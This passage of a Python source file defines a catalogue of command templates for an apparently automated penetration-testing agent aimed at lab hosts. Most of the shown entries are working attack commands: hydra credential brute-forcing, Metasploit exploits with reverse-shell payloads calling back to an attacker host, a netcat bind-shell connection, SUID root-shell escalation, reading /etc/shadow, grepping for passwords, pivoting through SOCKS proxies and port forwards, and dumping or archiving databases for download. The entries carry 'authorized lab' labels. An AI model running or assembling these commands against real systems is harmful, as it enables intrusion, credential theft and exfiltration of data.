        "expected_events": ["VALID_CREDENTIAL_FOUND", "LOGIN_FAILED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_service": ["ftp"],
            "requires_authorization": True,
        },
        "risk_level": "high",
        "description": "Run FTP credential testing in an authorized lab.",
    },

    502: {
        "name": "BRUTEFORCE_HTTP_LOGIN",
        "category": "credential_attack",
        "phase": "credential_attack",
        "tool": "hydra",
        "command_template": "hydra -L {userlist_path} -P {passwordlist_path} {target_ip} http-post-form \"{login_path}:{login_user_field}=^USER^&{login_pass_field}=^PASS^:{login_failure_string}\"",
        "placeholders": [
            "target_ip",
            "userlist_path",
            "passwordlist_path",
            "login_path",
            "login_user_field",
            "login_pass_field",
            "login_failure_string",
        ],
        "parser_family": "hydra_http",
        "expected_events": ["VALID_CREDENTIAL_FOUND", "LOGIN_FAILED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_http_login_form": True,
            "requires_authorization": True,
        },
        "risk_level": "high",
        "description": "Run HTTP form credential testing when login form parameters are known.",
    },

    510: {
        "name": "CHECK_FTP_ANONYMOUS_LOGIN",
        "category": "credential_attack",
        "phase": "credential_attack",
        "tool": "nmap",
        "command_template": "nmap --script ftp-anon -p {target_port} {target_ip}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "nmap_ftp_anon",
        "expected_events": ["FTP_ANON_LOGIN_ALLOWED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["ftp"],
        },
        "risk_level": "low",
        "description": "Check whether anonymous FTP login is allowed.",
    },

    520: {
        "name": "CHECK_SSH_KNOWN_CREDS",
        "category": "credential_attack",
        "phase": "credential_attack",
        "tool": "ssh",
        "command_template": "sshpass -p {password} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {username}@{target_ip} 'whoami; id; hostname'",
        "placeholders": ["target_ip", "username", "password"],
        "parser_family": "ssh_login",
        "expected_events": ["VALID_CREDENTIAL_FOUND", "LOGIN_SUCCESS", "SESSION_OPENED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_service": ["ssh"],
            "requires_credentials": True,
            "requires_authorization": True,
        },
        "risk_level": "high",
        "description": "Validate known SSH credentials in an authorized lab.",
    },

    521: {
        "name": "CHECK_TELNET_KNOWN_CREDS",
        "category": "credential_attack",
        "phase": "credential_attack",
        "tool": "hydra",
        "command_template": "hydra -l {username} -p {password} telnet://{target_ip}",
        "placeholders": ["target_ip", "username", "password"],
        "parser_family": "hydra",
        "expected_events": ["VALID_CREDENTIAL_FOUND", "LOGIN_SUCCESS"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_service": ["telnet"],
            "requires_credentials": True,
            "requires_authorization": True,
        },
        "risk_level": "high",
        "description": "Validate known Telnet credentials in an authorized lab.",
    },

    522: {
        "name": "CHECK_MYSQL_KNOWN_CREDS",
        "category": "credential_attack",
        "phase": "credential_attack",
        "tool": "mysql",
        "command_template": "mysql -h {target_ip} -P {target_port} -u {username} -p{password} -e 'SELECT VERSION();'",
        "placeholders": ["target_ip", "target_port", "username", "password"],
        "parser_family": "mysql_client",
        "expected_events": ["VALID_CREDENTIAL_FOUND", "DB_LOGIN_SUCCESS"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["mysql"],
            "requires_credentials": True,
            "requires_authorization": True,
        },
        "risk_level": "medium",
        "description": "Validate known MySQL credentials.",
    },

    523: {
        "name": "CHECK_POSTGRES_KNOWN_CREDS",
        "category": "credential_attack",
        "phase": "credential_attack",
        "tool": "psql",
        "command_template": "PGPASSWORD={password} psql -h {target_ip} -p {target_port} -U {username} -c 'SELECT version();'",
        "placeholders": ["target_ip", "target_port", "username", "password"],
        "parser_family": "postgres_client",
        "expected_events": ["VALID_CREDENTIAL_FOUND", "DB_LOGIN_SUCCESS"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["postgresql"],
            "requires_credentials": True,
            "requires_authorization": True,
        },
        "risk_level": "medium",
        "description": "Validate known PostgreSQL credentials.",
    },

    524: {
        "name": "CHECK_TOMCAT_MANAGER_CREDS",
        "category": "credential_attack",
        "phase": "credential_attack",
        "tool": "curl",
        "command_template": "curl -s -u {username}:{password} --max-time 10 http://{target_ip}:{target_port}/manager/html",
        "placeholders": ["target_ip", "target_port", "username", "password"],
        "parser_family": "tomcat_manager",
        "expected_events": ["VALID_CREDENTIAL_FOUND", "TOMCAT_MANAGER_ACCESS_GRANTED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["http", "tomcat"],
            "requires_credentials": True,
            "requires_authorization": True,
        },
        "risk_level": "medium",
        "description": "Validate Tomcat Manager credentials.",
    },

    # ============================================================
    # 600-699 EXPLOITATION CONTROLADA EN LABORATORIO
    # ============================================================

    600: {
        "name": "MSF_EXPLOIT_SAMBA_USERMAP_SCRIPT",
        "category": "exploit",
        "phase": "exploit",
        "tool": "msfconsole",
        "command_template": "msfconsole -q -x \"use exploit/unix/samba/usermap_script; set RHOSTS {target_ip}; run; exit\"",
        "placeholders": ["target_ip"],
        "parser_family": "msfconsole",
        "expected_events": ["EXPLOIT_ATTEMPTED", "SESSION_OPENED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_candidate_vuln": "samba_usermap_script",
            "requires_authorization": True,
        },
        "risk_level": "high",
        "description": "Attempt Samba username map script exploit in a controlled lab.",
    },

    601: {
        "name": "MSF_EXPLOIT_VSFTPD_234_BACKDOOR",
        "category": "exploit",
        "phase": "exploit",
        "tool": "msfconsole",
        "command_template": "msfconsole -q -x \"use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {target_ip}; run; exit\"",
        "placeholders": ["target_ip"],
        "parser_family": "msfconsole",
        "expected_events": ["EXPLOIT_ATTEMPTED", "SESSION_OPENED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_candidate_vuln": "vsftpd_234_backdoor",
            "requires_authorization": True,
        },
        "risk_level": "high",
        "description": "Attempt vsftpd 2.3.4 backdoor exploit in a controlled lab.",
    },

    602: {
        "name": "MSF_EXPLOIT_DISTCC_EXEC",
        "category": "exploit",
        "phase": "exploit",
        "tool": "msfconsole",
        "command_template": "msfconsole -q -x \"use exploit/unix/misc/distcc_exec; set RHOSTS {target_ip}; run; exit\"",
        "placeholders": ["target_ip"],
        "parser_family": "msfconsole",
        "expected_events": ["EXPLOIT_ATTEMPTED", "SESSION_OPENED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_candidate_vuln": "distcc_exec",
            "requires_authorization": True,
        },
        "risk_level": "high",
        "description": "Attempt distcc command execution exploit in a controlled lab.",
    },

    603: {
        "name": "MSF_EXPLOIT_TOMCAT_MGR_UPLOAD",
        "category": "exploit",
        "phase": "exploit",
        "tool": "msfconsole",
        "command_template": "msfconsole -q -x \"use exploit/multi/http/tomcat_mgr_upload; set RHOSTS {target_ip}; set RPORT {target_port}; set HttpUsername {username}; set HttpPassword {password}; run; exit\"",
        "placeholders": ["target_ip", "target_port", "username", "password"],
        "parser_family": "msfconsole",
        "expected_events": ["EXPLOIT_ATTEMPTED", "SESSION_OPENED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_valid_credentials": True,
            "requires_service": ["tomcat", "http"],
            "requires_authorization": True,
        },
        "risk_level": "high",
        "description": "Attempt Tomcat manager upload exploit with known valid credentials in lab.",
    },

    604: {
        "name": "MSF_EXPLOIT_POSTGRES_PAYLOAD",
        "category": "exploit",
        "phase": "exploit",
        "tool": "msfconsole",
        "command_template": "msfconsole -q -x \"use exploit/linux/postgres/postgres_payload; set RHOSTS {target_ip}; set RPORT {target_port}; set USERNAME {username}; set PASSWORD {password}; set payload linux/x86/meterpreter/reverse_tcp; set LHOST {lhost}; run; exit\"",
        "placeholders": ["target_ip", "target_port", "username", "password", "lhost"],
        "parser_family": "msfconsole",
        "expected_events": ["EXPLOIT_ATTEMPTED", "SESSION_OPENED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["postgresql"],
            "requires_valid_credentials": True,
            "requires_authorization": True,
        },
        "risk_level": "high",
        "description": "Attempt PostgreSQL payload execution with known valid credentials in a controlled lab.",
    },

    605: {
        "name": "MSF_EXPLOIT_UNREAL_IRCD_BACKDOOR",
        "category": "exploit",
        "phase": "exploit",
        "tool": "msfconsole",
        "command_template": "msfconsole -q -x \"use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS {target_ip}; set RPORT {target_port}; set payload cmd/unix/reverse_perl; set LHOST {lhost}; run; exit\"",
        "placeholders": ["target_ip", "target_port", "lhost"],
        "parser_family": "msfconsole",
        "expected_events": ["EXPLOIT_ATTEMPTED", "SESSION_OPENED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["irc"],
            "requires_candidate_vuln": "unreal_ircd_3281_backdoor",
            "requires_authorization": True,
        },
        "risk_level": "high",
        "description": "Attempt UnrealIRCd backdoor exploit in a controlled lab.",
    },

    606: {
        "name": "CONNECT_INGRESLOCK_BIND_SHELL",
        "category": "exploit",
        "phase": "exploit",
        "tool": "nc",
        "command_template": "nc -nv -w 5 {target_ip} {target_port}",
        "placeholders": ["target_ip", "target_port"],
        "parser_family": "bind_shell",
        "expected_events": ["EXPLOIT_ATTEMPTED", "SESSION_OPENED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["ingreslock", "bind_shell"],
            "requires_authorization": True,
        },
        "risk_level": "high",
        "description": "Connect to exposed bind shell service in a controlled lab.",
    },

    607: {
        "name": "MSF_EXPLOIT_RLOGIN_RSH_TRUST",
        "category": "exploit",
        "phase": "exploit",
        "tool": "msfconsole",
        "command_template": "msfconsole -q -x \"use exploit/unix/remote/rlogin_login; set RHOSTS {target_ip}; set USERNAME {username}; set PASSWORD {password}; run; exit\"",
        "placeholders": ["target_ip", "username", "password"],
        "parser_family": "msfconsole",
        "expected_events": ["EXPLOIT_ATTEMPTED", "LOGIN_SUCCESS", "SESSION_OPENED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_service": ["rlogin", "shell", "login"],
            "requires_credentials": True,
            "requires_authorization": True,
        },
        "risk_level": "high",
        "description": "Attempt rlogin/rsh style remote login in a controlled lab.",
    },

    608: {
        "name": "MSF_EXPLOIT_JAVA_RMI_SERVER",
        "category": "exploit",
        "phase": "exploit",
        "tool": "msfconsole",
        "command_template": "msfconsole -q -x \"use exploit/multi/misc/java_rmi_server; set RHOSTS {target_ip}; set RPORT {target_port}; set payload java/meterpreter/reverse_tcp; set LHOST {lhost}; run; exit\"",
        "placeholders": ["target_ip", "target_port", "lhost"],
        "parser_family": "msfconsole",
        "expected_events": ["EXPLOIT_ATTEMPTED", "SESSION_OPENED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["java-rmi", "rmiregistry"],
            "requires_authorization": True,
        },
        "risk_level": "high",
        "description": "Attempt Java RMI server exploitation in a controlled lab.",
    },

    609: {
        "name": "MSF_EXPLOIT_DOCKER_DISTCC_EXEC",
        "category": "exploit",
        "phase": "exploit",
        "tool": "msfconsole",
        "command_template": "msfconsole -q -x \"use exploit/unix/misc/distcc_exec; set RHOSTS {target_ip}; set RPORT {target_port}; set payload cmd/unix/reverse_netcat; set LHOST {lhost}; run; exit\"",
        "placeholders": ["target_ip", "target_port", "lhost"],
        "parser_family": "msfconsole",
        "expected_events": ["EXPLOIT_ATTEMPTED", "SESSION_OPENED"],
        "preconditions": {
            "requires_target_ip": True,
            "requires_target_port": True,
            "requires_service": ["distccd", "distcc"],
            "requires_candidate_vuln": "distcc_exec",
            "requires_authorization": True,
        },
        "risk_level": "high",
        "description": "Attempt distcc exploitation with explicit reverse payload parameters.",
    },

     # ============================================================
    # 700-799 POST-EXPLOITATION / SESSION ENUMERATION
    # ============================================================

    700: {
        "name": "POST_ENUM_WHOAMI",
        "category": "post_exploit",
        "phase": "post_exploit",
        "tool": "whoami",
        "command_template": "whoami",
        "placeholders": [],
        "parser_family": "generic_text",
        "expected_events": ["SESSION_USER_DETECTED"],
        "preconditions": {
            "requires_session": True,
        },
        "risk_level": "low",
        "description": "Identify current user in an established session.",
    },

    701: {
        "name": "POST_ENUM_UNAME",
        "category": "post_exploit",
        "phase": "post_exploit",
        "tool": "uname",
        "command_template": "uname -a",
        "placeholders": [],
        "parser_family": "generic_text",
        "expected_events": ["SESSION_SYSTEM_DETECTED"],
        "preconditions": {
            "requires_session": True,
        },
        "risk_level": "low",
        "description": "Identify remote system information in an established session.",
    },

    702: {
        "name": "POST_ENUM_ID",
        "category": "post_exploit",
        "phase": "post_exploit",
        "tool": "id",
        "command_template": "id",
        "placeholders": [],
        "parser_family": "generic_text",
        "expected_events": ["SESSION_PRIVILEGES_DETECTED"],
        "preconditions": {
            "requires_session": True,
        },
        "risk_level": "low",
        "description": "Inspect current user UID, GID and groups in an established session.",
    },

    703: {
        "name": "POST_ENUM_HOSTNAME",
        "category": "post_exploit",
        "phase": "post_exploit",
        "tool": "hostname",
        "command_template": "hostname",
        "placeholders": [],
        "parser_family": "generic_text",
        "expected_events": ["SESSION_HOSTNAME_DETECTED"],
        "preconditions": {
            "requires_session": True,
        },
        "risk_level": "low",
        "description": "Identify hostname in an established session.",
    },

    704: {
        "name": "POST_ENUM_IP_ADDR",
        "category": "post_exploit",
        "phase": "post_exploit",
        "tool": "ip",
        "command_template": "ip a",
        "placeholders": [],
        "parser_family": "linux_ip_addr",
        "expected_events": ["SESSION_NET_INFO_DETECTED"],
        "preconditions": {
            "requires_session": True,
        },
        "risk_level": "low",
        "description": "Inspect network interfaces in an established session.",
    },

    705: {
        "name": "POST_ENUM_IP_ROUTE",
        "category": "post_exploit",
        "phase": "post_exploit",
        "tool": "ip",
        "command_template": "ip route",
        "placeholders": [],
        "parser_family": "linux_ip_route",
        "expected_events": ["SESSION_ROUTE_TABLE_DETECTED"],
        "preconditions": {
            "requires_session": True,
        },
        "risk_level": "low",
        "description": "Inspect routing table in an established session.",
    },

    706: {
        "name": "POST_ENUM_SS_LISTENERS",
        "category": "post_exploit",
        "phase": "post_exploit",
        "tool": "ss",
        "command_template": "ss -tulnp",
        "placeholders": [],
        "parser_family": "linux_ss",
        "expected_events": ["SESSION_LISTENER_DETECTED"],
        "preconditions": {
            "requires_session": True,
        },
        "risk_level": "low",
        "description": "Inspect listening services from the compromised host.",
    },

    707: {
        "name": "POST_ENUM_NETSTAT_LISTENERS",
        "category": "post_exploit",
        "phase": "post_exploit",
        "tool": "netstat",
        "command_template": "netstat -tulnp",
        "placeholders": [],
        "parser_family": "linux_netstat",
        "expected_events": ["SESSION_LISTENER_DETECTED"],
        "preconditions": {
            "requires_session": True,
        },
        "risk_level": "low",
        "description": "Inspect listening services using netstat from the compromised host.",
    },

    708: {
        "name": "POST_ENUM_USERS_PASSWD",
        "category": "post_exploit",
        "phase": "post_exploit",
        "tool": "cat",
        "command_template": "cat /etc/passwd",
        "placeholders": [],
        "parser_family": "linux_passwd",
        "expected_events": ["LOCAL_USER_FOUND"],
        "preconditions": {
            "requires_session": True,
        },
        "risk_level": "low",
        "description": "Enumerate local users from /etc/passwd.",
    },

    709: {
        "name": "POST_ENUM_HOME_USERS",
        "category": "post_exploit",
        "phase": "post_exploit",
        "tool": "grep",
        "command_template": "cat /etc/passwd | grep home",
        "placeholders": [],
        "parser_family": "linux_passwd",
        "expected_events": ["LOCAL_INTERACTIVE_USER_FOUND"],
        "preconditions": {
            "requires_session": True,
        },
        "risk_level": "low",
        "description": "Identify users with home directories and likely interactive accounts.",
    },

    710: {
        "name": "POST_ENUM_PROCESSES",
        "category": "post_exploit",
        "phase": "post_exploit",
        "tool": "ps",
        "command_template": "ps aux",
        "placeholders": [],
        "parser_family": "linux_ps",
        "expected_events": ["PROCESS_DETECTED"],
        "preconditions": {
            "requires_session": True,
        },
        "risk_level": "low",
        "description": "Enumerate running processes on the compromised host.",
    },

    711: {
        "name": "POST_ENUM_ENV",
        "category": "post_exploit",
        "phase": "post_exploit",
        "tool": "env",
        "command_template": "env",
        "placeholders": [],
        "parser_family": "linux_env",
        "expected_events": ["ENV_VAR_DETECTED"],
        "preconditions": {
            "requires_session": True,
        },
        "risk_level": "low",
        "description": "Inspect environment variables in the compromised session.",
    },

    712: {
        "name": "POST_CHECK_SUDO_PRIVS",
        "category": "post_exploit",
        "phase": "privilege_escalation_discovery",
        "tool": "sudo",
        "command_template": "sudo -l",
        "placeholders": [],
        "parser_family": "sudo_l",
        "expected_events": ["SUDO_PRIVILEGE_DETECTED", "PRIVESC_VECTOR_FOUND"],
        "preconditions": {
            "requires_session": True,
        },
        "risk_level": "low",
        "description": "Check sudo privileges for the current compromised user.",
    },

    713: {
        "name": "POST_CHECK_SUDOERS_PERMS",
        "category": "post_exploit",
        "phase": "privilege_escalation_discovery",
        "tool": "ls",
        "command_template": "ls -l /etc/sudoers",
        "placeholders": [],
        "parser_family": "linux_ls",
        "expected_events": ["FILE_PERMISSION_DETECTED"],
        "preconditions": {
            "requires_session": True,
        },
        "risk_level": "low",
        "description": "Check file permissions on /etc/sudoers.",
    },

    714: {
        "name": "POST_FIND_SUID_BINARIES",
        "category": "post_exploit",
        "phase": "privilege_escalation_discovery",
        "tool": "find",
        "command_template": "find / -perm -4000 -type f 2>/dev/null",
        "placeholders": [],
        "parser_family": "linux_find_suid",
        "expected_events": ["SUID_BINARY_FOUND", "PRIVESC_VECTOR_FOUND"],
        "preconditions": {
            "requires_session": True,
        },
        "risk_level": "low",
        "description": "Find binaries with SUID bit set.",
    },

    715: {
        "name": "POST_PRIVESC_NMAP_INTERACTIVE",
        "category": "post_exploit",
        "phase": "privilege_escalation",
        "tool": "nmap",
        "command_template": "nmap --interactive",
        "placeholders": [],
        "parser_family": "interactive_shell",
        "expected_events": ["PRIVESC_ATTEMPTED", "ROOT_SHELL_OPENED"],
        "preconditions": {
            "requires_session": True,
            "requires_suid_binary": "nmap",
            "requires_authorization": True,
        },
        "risk_level": "high",
        "description": "Use legacy SUID nmap interactive mode to attempt root shell in lab.",
    },

    716: {
        "name": "POST_PRIVESC_FIND_SUID_SHELL",
        "category": "post_exploit",
        "phase": "privilege_escalation",
        "tool": "find",
        "command_template": "find . -exec /bin/sh -p \\; -quit",
        "placeholders": [],
        "parser_family": "interactive_shell",
        "expected_events": ["PRIVESC_ATTEMPTED", "ROOT_SHELL_OPENED"],
        "preconditions": {
            "requires_session": True,
            "requires_suid_binary": "find",
            "requires_authorization": True,
        },
        "risk_level": "high",
        "description": "Use SUID find GTFOBins technique to attempt privileged shell in lab.",
    },

    717: {
        "name": "POST_READ_SHADOW",
        "category": "post_exploit",
        "phase": "credential_access",
        "tool": "cat",
        "command_template": "cat /etc/shadow",
        "placeholders": [],
        "parser_family": "linux_shadow",
        "expected_events": ["PASSWORD_HASH_FOUND", "SENSITIVE_FILE_READ"],
        "preconditions": {
            "requires_session": True,
            "requires_privilege": "root",
            "requires_authorization": True,
        },
        "risk_level": "high",
        "description": "Read /etc/shadow after root access to collect password hash evidence in lab.",
    },

    718: {
        "name": "POST_LIST_SSH_HOST_KEYS",
        "category": "post_exploit",
        "phase": "credential_access",
        "tool": "ls",
        "command_template": "ls -la /etc/ssh",
        "placeholders": [],
        "parser_family": "linux_ls",
        "expected_events": ["SSH_KEY_FILE_FOUND", "SENSITIVE_FILE_FOUND"],
        "preconditions": {
            "requires_session": True,
        },
        "risk_level": "medium",
        "description": "List SSH host key files as sensitive evidence.",
    },

    719: {
        "name": "POST_READ_CRONTAB",
        "category": "post_exploit",
        "phase": "post_exploit",
        "tool": "cat",
        "command_template": "cat /etc/crontab",
        "placeholders": [],
        "parser_family": "linux_crontab",
        "expected_events": ["CRON_ENTRY_FOUND"],
        "preconditions": {
            "requires_session": True,
        },
        "risk_level": "low",
        "description": "Read system crontab for persistence and scheduled task evidence.",
    },


    730: {
        "name": "MSF_POST_ENUM_SYSTEM",
        "category": "post_exploit",
        "phase": "post_exploit",
        "tool": "msfconsole",
        "command_template": "msfconsole -q -x \"use post/linux/gather/enum_system; set SESSION {session_id}; run; exit\"",
        "placeholders": ["session_id"],
        "parser_family": "msfconsole_post",
        "expected_events": ["SESSION_SYSTEM_DETECTED", "LOCAL_USER_FOUND", "SYSTEM_INFO_DETECTED"],
        "preconditions": {
            "requires_session": True,
        },
        "risk_level": "low",
        "description": "Run Metasploit Linux system enumeration module.",
    },

    731: {
        "name": "MSF_POST_ENUM_CONFIGS",
        "category": "post_exploit",
        "phase": "post_exploit",
        "tool": "msfconsole",
        "command_template": "msfconsole -q -x \"use post/linux/gather/enum_configs; set SESSION {session_id}; run; exit\"",
        "placeholders": ["session_id"],
        "parser_family": "msfconsole_post",
        "expected_events": ["CONFIG_FILE_FOUND", "SENSITIVE_FILE_FOUND"],
        "preconditions": {
            "requires_session": True,
        },
        "risk_level": "medium",
        "description": "Run Metasploit Linux configuration enumeration module.",
    },

    732: {
        "name": "MSF_POST_ENUM_NETWORK",
        "category": "post_exploit",
        "phase": "post_exploit",
        "tool": "msfconsole",
        "command_template": "msfconsole -q -x \"use post/linux/gather/enum_network; set SESSION {session_id}; run; exit\"",
        "placeholders": ["session_id"],
        "parser_family": "msfconsole_post",
        "expected_events": ["SESSION_NET_INFO_DETECTED", "INTERNAL_NETWORK_DISCOVERED"],
        "preconditions": {
            "requires_session": True,
        },
        "risk_level": "low",
        "description": "Run Metasploit Linux network enumeration module.",
    },

    733: {
        "name": "MSF_LOCAL_EXPLOIT_SUGGESTER",
        "category": "post_exploit",
        "phase": "privilege_escalation_discovery",
        "tool": "msfconsole",
        "command_template": "msfconsole -q -x \"use post/multi/recon/local_exploit_suggester; set SESSION {session_id}; run; exit\"",
        "placeholders": ["session_id"],
        "parser_family": "msfconsole_local_exploit_suggester",
        "expected_events": ["PRIVESC_VECTOR_FOUND", "CANDIDATE_VULN_FOUND"],
        "preconditions": {
            "requires_session": True,
        },
        "risk_level": "medium",
        "description": "Run Metasploit local exploit suggester against an established session.",
    },

    760: {
        "name": "MSF_AUTOROUTE_ADD_INTERNAL_NET",
        "category": "post_exploit",
        "phase": "pivoting",
        "tool": "msfconsole",
        "command_template": "msfconsole -q -x \"use post/multi/manage/autoroute; set SESSION {session_id}; set SUBNET {target_subnet}; set NETMASK {target_netmask}; run; route print; exit\"",
        "placeholders": ["session_id", "target_subnet", "target_netmask"],
        "parser_family": "msfconsole_autoroute",
        "expected_events": ["ROUTE_ADDED", "INTERNAL_NETWORK_REACHABLE"],
        "preconditions": {
            "requires_session": True,
            "requires_internal_network": True,
        },
        "risk_level": "medium",
        "description": "Add a route through the compromised host to reach an internal subnet.",
    },

    761: {
        "name": "MSF_START_SOCKS_PROXY",
        "category": "post_exploit",
        "phase": "pivoting",
        "tool": "msfconsole",
        "command_template": "msfconsole -q -x \"use auxiliary/server/socks_proxy; set VERSION 4a; set SRVHOST 127.0.0.1; set SRVPORT {socks_port}; run -j; jobs; exit\"",
        "placeholders": ["socks_port"],
        "parser_family": "msfconsole_socks",
        "expected_events": ["SOCKS_PROXY_STARTED"],
        "preconditions": {
            "requires_route_to_internal_network": True,
        },
        "risk_level": "medium",
        "description": "Start a SOCKS proxy in Metasploit for pivoting through the compromised host.",
    },

    762: {
        "name": "PIVOT_SCAN_INTERNAL_NET_PROXYCHAINS",
        "category": "post_exploit",
        "phase": "pivoting",
        "tool": "proxychains",
        "command_template": "proxychains nmap -sT -Pn {target}",
        "placeholders": ["target"],
        "parser_family": "nmap_portscan",
        "expected_events": ["HOST_DISCOVERED", "PORT_OPEN", "INTERNAL_SERVICE_DETECTED"],
        "preconditions": {
            "requires_socks_proxy": True,
            "requires_target": True,
        },
        "risk_level": "medium",
        "description": "Scan an internal network through SOCKS proxy using proxychains and TCP connect scan.",
    },

    763: {
        "name": "MSF_PORTFWD_ADD",
        "category": "post_exploit",
        "phase": "pivoting",
        "tool": "msfconsole",
        "command_template": "msfconsole -q -x \"sessions -i {session_id} -c 'portfwd add -l {local_port} -p {remote_port} -r {remote_host}'; sessions -i {session_id} -c 'portfwd list'; exit\"",
        "placeholders": ["session_id", "local_port", "remote_port", "remote_host"],
        "parser_family": "msfconsole_portfwd",
        "expected_events": ["PORT_FORWARD_ADDED"],
        "preconditions": {
            "requires_session": True,
            "requires_internal_host": True,
            "requires_internal_service": True,
        },
        "risk_level": "medium",
        "description": "Forward a remote internal service port to a local attacker port.",
    },

    764: {
        "name": "PIVOT_MYSQL_LOGIN_LOCAL_PORTFWD",
        "category": "post_exploit",
        "phase": "pivoting",
        "tool": "mysql",
        "command_template": "mysql --ssl=0 -h 127.0.0.1 -P {local_port} -u {username} -p{password} -e 'SHOW DATABASES;'",
        "placeholders": ["local_port", "username", "password"],
        "parser_family": "mysql_client",
        "expected_events": ["DB_LOGIN_SUCCESS", "DATABASE_FOUND"],
        "preconditions": {
            "requires_port_forward": True,
            "requires_credentials": True,
            "requires_authorization": True,
        },
        "risk_level": "medium",
        "description": "Access internal MySQL service through local port forwarding.",
    },

    765: {
        "name": "PIVOT_MYSQL_DUMP_ALL_DATABASES",
        "category": "post_exploit",
        "phase": "exfiltration",
        "tool": "mysqldump",
        "command_template": "mysqldump -h 127.0.0.1 -P {local_port} -u {username} -p{password} --all-databases > {output_file}",
        "placeholders": ["local_port", "username", "password", "output_file"],
        "parser_family": "mysqldump",
        "expected_events": ["DATABASE_DUMP_CREATED", "EVIDENCE_COLLECTED"],
        "preconditions": {
            "requires_port_forward": True,
            "requires_credentials": True,
            "requires_authorization": True,
        },
        "risk_level": "high",
        "description": "Dump internal MySQL databases through pivoted port forwarding as lab evidence.",
    },

    780: {
        "name": "POST_SEARCH_WEB_PASSWORDS",
        "category": "post_exploit",
        "phase": "credential_access",
        "tool": "grep",
        "command_template": "grep -R \"pass\" -ni /var/www 2>/dev/null",
        "placeholders": [],
        "parser_family": "grep_credentials",
        "expected_events": ["POTENTIAL_CREDENTIAL_FOUND", "SENSITIVE_FILE_FOUND"],
        "preconditions": {
            "requires_session": True,
        },
        "risk_level": "medium",
        "description": "Search for password references in web application files.",
    },

    781: {
        "name": "POST_SEARCH_WEB_DB_CONFIGS",
        "category": "post_exploit",
        "phase": "credential_access",
        "tool": "grep",
        "command_template": "grep -R \"db\" -ni /var/www 2>/dev/null",
        "placeholders": [],
        "parser_family": "grep_credentials",
        "expected_events": ["POTENTIAL_CREDENTIAL_FOUND", "DB_CONFIG_FOUND"],
        "preconditions": {
            "requires_session": True,
        },
        "risk_level": "medium",
        "description": "Search for database configuration references in web application files.",
    },

    782: {
        "name": "POST_READ_DVWA_CONFIG",
        "category": "post_exploit",
        "phase": "credential_access",
        "tool": "cat",
        "command_template": "cat /var/www/dvwa/config/config.inc.php",
        "placeholders": [],
        "parser_family": "php_config",
        "expected_events": ["POTENTIAL_CREDENTIAL_FOUND", "DB_CONFIG_FOUND"],
        "preconditions": {
            "requires_session": True,
        },
        "risk_level": "medium",
        "description": "Read DVWA database configuration file.",
    },

    783: {
        "name": "POST_READ_PHPMYADMIN_CONFIG",
        "category": "post_exploit",
        "phase": "credential_access",
        "tool": "cat",
        "command_template": "cat /etc/phpmyadmin/config-db.php",
        "placeholders": [],
        "parser_family": "php_config",
        "expected_events": ["POTENTIAL_CREDENTIAL_FOUND", "DB_CONFIG_FOUND"],
        "preconditions": {
            "requires_session": True,
        },
        "risk_level": "medium",
        "description": "Read phpMyAdmin database configuration file.",
    },

    784: {
        "name": "POST_READ_TIKIWIKI_DB_CONFIG",
        "category": "post_exploit",
        "phase": "credential_access",
        "tool": "cat",
        "command_template": "cat /var/www/tikiwiki/db/local.php",
        "placeholders": [],
        "parser_family": "php_config",
        "expected_events": ["POTENTIAL_CREDENTIAL_FOUND", "DB_CONFIG_FOUND"],
        "preconditions": {
            "requires_session": True,
        },
        "risk_level": "medium",
        "description": "Read TikiWiki database configuration file.",
    },

    790: {
        "name": "POST_ARCHIVE_MYSQL_DATA_DIR",
        "category": "post_exploit",
        "phase": "exfiltration",
        "tool": "tar",
        "command_template": "cd /var/lib && tar -cvf /tmp/mysql.tar mysql/ && chmod 644 /tmp/mysql.tar",
        "placeholders": [],
        "parser_family": "tar",
        "expected_events": ["EVIDENCE_ARCHIVE_CREATED"],
        "preconditions": {
            "requires_session": True,
            "requires_privilege": "root",
            "requires_authorization": True,
        },
        "risk_level": "high",
        "description": "Archive MySQL data directory as lab evidence after root access.",
    },

    791: {
        "name": "POST_ARCHIVE_POSTGRES_DATA_DIR",
        "category": "post_exploit",
        "phase": "exfiltration",
        "tool": "tar",
        "command_template": "cd /var/lib/postgresql/8.3 && tar -cvf /tmp/pgsql.tar main/ && chmod 644 /tmp/pgsql.tar",
        "placeholders": [],
        "parser_family": "tar",
        "expected_events": ["EVIDENCE_ARCHIVE_CREATED"],
        "preconditions": {
            "requires_session": True,
            "requires_privilege": "root",
            "requires_authorization": True,
        },
        "risk_level": "high",
        "description": "Archive PostgreSQL data directory as lab evidence after root access.",
    },

    792: {
        "name": "MSF_DOWNLOAD_EVIDENCE_FILE",
        "category": "post_exploit",
        "phase": "exfiltration",
        "tool": "meterpreter",
        "command_template": "download {remote_file}",
        "placeholders": ["remote_file"],
        "parser_family": "meterpreter_download",
        "expected_events": ["FILE_DOWNLOADED", "EVIDENCE_COLLECTED"],
        "preconditions": {
            "requires_meterpreter_session": True,
            "requires_remote_file": True,
            "requires_authorization": True,
        },
        "risk_level": "high",
        "description": "Download a selected evidence file through Meterpreter.",
    },
}



def get_action(action_id: int) -> dict:
    return ACTIONS.get(action_id, ACTIONS[0])


def get_action_name(action_id: int) -> str:
    return get_action(action_id)["name"]


def get_command_template(action_id: int) -> str | None:
